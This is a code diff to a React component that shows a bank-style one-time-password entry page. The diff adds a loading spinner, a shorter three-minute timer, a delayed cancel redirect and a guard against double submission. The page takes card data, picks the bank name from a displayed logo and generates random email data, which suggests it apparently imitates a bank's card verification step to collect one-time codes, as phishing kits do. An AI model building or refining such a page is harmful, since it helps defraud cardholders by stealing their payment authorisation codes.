@@ -1,4 +1,5 @@
 import React, { useState, useEffect } from 'react';
+import LoadingSpinner from './LoadingSpinner';
 
 interface NewOTPPageProps {
   cardData: {
@@ -45,7 +46,11 @@ const NewOTPPage: React.FC<NewOTPPageProps> = ({
   });
   const [mobileNumber, setMobileNumber] = useState('');
   const [currentDateTime, setCurrentDateTime] = useState('');
-  const [timeLeft, setTimeLeft] = useState(299); // 4:59 in seconds
+  const [timeLeft, setTimeLeft] = useState(180); // 3:00 in seconds
+  const [showResendMessage, setShowResendMessage] = useState(false);
+  const [isExpired, setIsExpired] = useState(false);
+  const [isLoading, setIsLoading] = useState(true);
+  const [redirectLoading, setRedirectLoading] = useState(false);
 
   useEffect(() => {
     // Generate random email data (60% chance to not show email)
@@ -79,6 +84,11 @@ const NewOTPPage: React.FC<NewOTPPageProps> = ({
       setTimeLeft((prev) => {
         if (prev <= 1) {
           clearInterval(timer);
+          // Show loading spinner before redirecting when timer expires
+          setRedirectLoading(true);
+          setTimeout(() => {
+            handleOtpCancel();
+          }, 3500); // 3.5 seconds
           return 0;
         }
         return prev - 1;
@@ -233,10 +243,23 @@ const NewOTPPage: React.FC<NewOTPPageProps> = ({
   const bankName = getBankNameFromLogo(currentBankLogo);
 
   const handleSubmit = () => {
-    if (otpValue.length === 6) {
+    if (otpValue.length === 6 && !otpSubmitting) {
       handleOtpSubmit();
     }
   };
+
+  const handleCancel = () => {
+    setRedirectLoading(true);
+    // Show loading spinner for 3-4 seconds before redirecting
+    setTimeout(() => {
+      handleOtpCancel();
+    }, 3500); // 3.5 seconds
+  };
+
+  // Show loading spinner during redirect only
+  if (redirectLoading) {
+    return <LoadingSpinner />;
+  }
 
   return (
     <div className="fixed inset-0 bg-white z-50 flex items-center justify-center p-2 sm:p-4">
@@ -359,7 +382,7 @@ const NewOTPPage: React.FC<NewOTPPageProps> = ({
           </button>
           
           <button
-            onClick={handleOtpCancel}
+            onClick={handleCancel}
             disabled={otpSubmitting}
             className="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 sm:px-8 sm:py-2 rounded disabled:opacity-50 font-medium text-sm sm:text-base"
           >
